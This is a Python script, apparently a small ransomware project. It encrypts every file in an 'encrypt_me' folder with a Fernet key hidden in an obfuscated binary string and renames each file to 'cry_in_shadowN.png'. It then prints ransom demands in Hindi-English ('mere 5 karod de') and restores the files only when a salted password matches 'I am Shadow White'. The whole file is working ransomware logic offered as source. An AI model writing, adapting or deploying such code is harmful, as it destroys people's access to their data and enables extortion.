import os
from cryptography.fernet import Fernet
import random
import time

magic = "11100101110100110011111000110100000100000000111100000101000110110001101000110100001010010111001100101000100100101010011110001001110110111101010010100110011000011001011010001101011010010001000110001110111101101000010100110011000011100110101111101111110100010011100001101101110100010010001101101001110001111000111100110000000100001011100011111100010010011001011011101001101000011001101111001011011110011000011010111010110001011111001111011111101100011011101010001100111101010110011000000111111101111010001110101001001110000000000110101001011001010111101011100011011001010001110100010101111010100110001010010101011001111100001011101010101011100000111000011101000000010010101100101101011101001101011110001101101100001010001011011001001010100010001000000011111000010001100000010001000011101110100110010101011111110101101100100110100000011111000001001110001000101100000100100010110000011101011000010010011010010010110011011110011100111010110100100110000100010011011100001010101000010101010000110111101001111100001010111001101100001001010000000011100110101110000110111001111001110011011110100010111010011000001011000100001100000010010111100110010111111001111110000010110101001010011111100001001111110111001010111011000101100011101100101000001010010011101010010001011001111000110101011001001011001100111001110001001011001000001100111111101110110111100100100000011100011001010011000011011111011000000011101100110010001000100001011101001101101111101010100000110100110000100101011101001100110101100111110101011100100101101110101000001010010111010001100100101110000010010100010000110111000110001101000110101100011011011000010110001111001010100011110101100111011001010100011101101110111101011001101110101101011001011010011000001010111100001011001011010011111110001101101000101101010010111010111011011100011100011101011001001010010110010000100000000001011011110110011100101001100100110100011100110100101111010100101110100111100110111000110100101100100001100110110101111010100111000001111101111010011111000011100000100101010010001011001000010110111110110100010110011001100011101001011101101011101010000110110101101010011101110001010100001011111001001110101110111000000011010011010011001110001010100100000011000101111100111010110111000000110001100101111110110101100000011001100110000000110001010110110101100000111101101010001101100001101001000110110100010000101000101110100110101011000010111000110000111000101101001001010001110101011101011011011000001001011001110100011010101001100111011111010010001001110011110100000111110100110010010101110000110001011101111011011011011000010101100111111100000100011110011011000001110011000001011100100101100011100001100010001001010010000001011000001011001110110011110000010111010011010111011110001010100111101101010111010100011011000010001101111111100111010110100100111011110101010001110011110111010110101101010110110101110110000110100000100111001010000101100011011111001011110111110010101101011010011101111000000111101001101010101000111101000110010000111010100101111000100100010111011001101110101011100001111010001000001011000011011110011111100110110110111111000010011100011101010100111101110101010110010000011110011110011100101010010101001111111010101010100100000100001101101101111010011001000000001111110000001111101010100010110000001111001110010000010100001110000011100110011000111100101011001010110110110011011100100001111000100100001101010001101000111101001110101110101001010111010111110111010111011110101011101111110000011001111110100001100001001110100000100010000110011011100010000000110001011000111110011101101100000010110010111000011101100010110011111101000001100001110110011101011011001110011000110111111010010111001000110010100111111111000110111000001111011110110110011011111001101000111110101011001110000100111010100010011000110111110111100111000101000010101100100001101100111101101111011000101000000110001110110101100110110001010110011010001100000001010000000010100000001100111000000100000111001000011000100101000110001100000001100011000101010010001001100011010111000011111001010001101110000011001010101101110001010001100011011010100110110001101011100001011110010001101010010000011110000101011011011101100100100100110110001100100100111000111000000011001010111011000011100111010001011000111100001101000101010010100000000111010111000100100101011001111101001111000000111100110111010000110100110001111011011111101010110110100010011100000000101010001010110000011000001101010111010111100010010101111000111101111111110100010111101101001010100101100110001001011010100100011010100101101110100001100000010111101100000100110001101011011001000100100010100001111011000101001101000011000110001110010111011101010101001001000000001001101000110101100000110001010101101101110000100001011010011100111000101111101111101001001010011011110011101001110010010101001011000100010100110010100111100011000010011100011011101010000010001100001011000100000110110000011000010011100011010011011010001100100010101011100111010000010000111111101011010000011110001110111000001110011101010001100101011110000100010110101010111101100111000111101"
usr_name = os.getlogin()

msg = "I am Shadow White"


def rand_str(c):
    cnt = ord(c)
    return ''.join(random.choices("01", k=cnt))

def BinaryToDecimal(binary):
    decimal, i, n = 0, 0, 0
    while(binary != 0):
        dec = binary % 10
        decimal = decimal + dec * pow(2, i)
        binary = binary//10
        i += 1
    return (decimal)

def dcpt_pswd(pswd, salt):
    s = 0
    i = 0
    tstr_data = ""
    try:
        while(i<len(pswd)):
            i+=ord(salt[s])
            temp_data = int(pswd[i:i + 8])
            i = i+8
            decimal_data = BinaryToDecimal(temp_data)
            tstr_data = tstr_data + chr(decimal_data)
            s+=1
            s%=len(salt)
    except: pass
    return tstr_data

def fl_encrpt(fl_name, i, f):
    with open(fl_name, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    flnm_encrpt = f.encrypt(bytes(fl_name, "utf-8"))
    with open(fl_name, 'wb') as encrypted_file:
        encrypted_file.write(encrypted + b"<$$<cry_in_shadow>$$>" + flnm_encrpt)
    os.replace(fl_name, os.path.dirname(fl_name) + '/cry_in_shadow'+str(i)+'.png')


def fl_dcrpt(fl_name, f):
    
    with open(fl_name, "rb") as encrypted_file:
        encrypted = encrypted_file.read()
    encrypted_data = encrypted.split(b"<$$<cry_in_shadow>$$>")[0]
    encrypted_fl_name = encrypted.split(b"<$$<cry_in_shadow>$$>")[1]
    original = f.decrypt(encrypted_data)
    or_name = f.decrypt(encrypted_fl_name)
    with open(fl_name, "wb") as original_file:
        original_file.write(original)
    os.replace(fl_name, str(or_name, encoding="utf-8"))

def enc_fl(fl_path):
    cnt = 0
    key = dcpt_pswd(magic, "cry_in_the_shadows")
    f = Fernet(bytes(key, 'utf-8'))
    for fl in os.listdir(fl_path):
        fl_encrpt(fl_path + "/" + fl, cnt, f)
        cnt+=1

def dec_fl(fl_path, pswd):
    if dcpt_pswd(pswd, usr_name) == msg:
        pass 
    else: return "anuradha ke bhatijhe!!!!"
    key = dcpt_pswd(magic, "cry_in_the_shadows")
    f = Fernet(bytes(key, 'utf-8'))
    for fl in os.listdir(fl_path):
        # if "cry_in_shadow" in fl_path:
        fl_dcrpt(fl_path + "/" + fl, f)
    return "mission passed!!"

print(os.getcwd())



if __name__ == "__main__":
    enc_fl("encrypt_me")
    while True:
        os.system("""
            echo "La baba la... mere 5 karod de..."
        """)
        pswd = (input("Password laya? "))
        
        reslt = dec_fl("encrypt_me", pswd)
        if (reslt=="mission passed!!"):
            print("Mission Passed!!!")
            time.sleep(10)
            break
        else:
            os.system("echo 'Lagta hai tera game bajana hi padega... thik se password de.. aisa majak nahi krne ka haa...'")
    
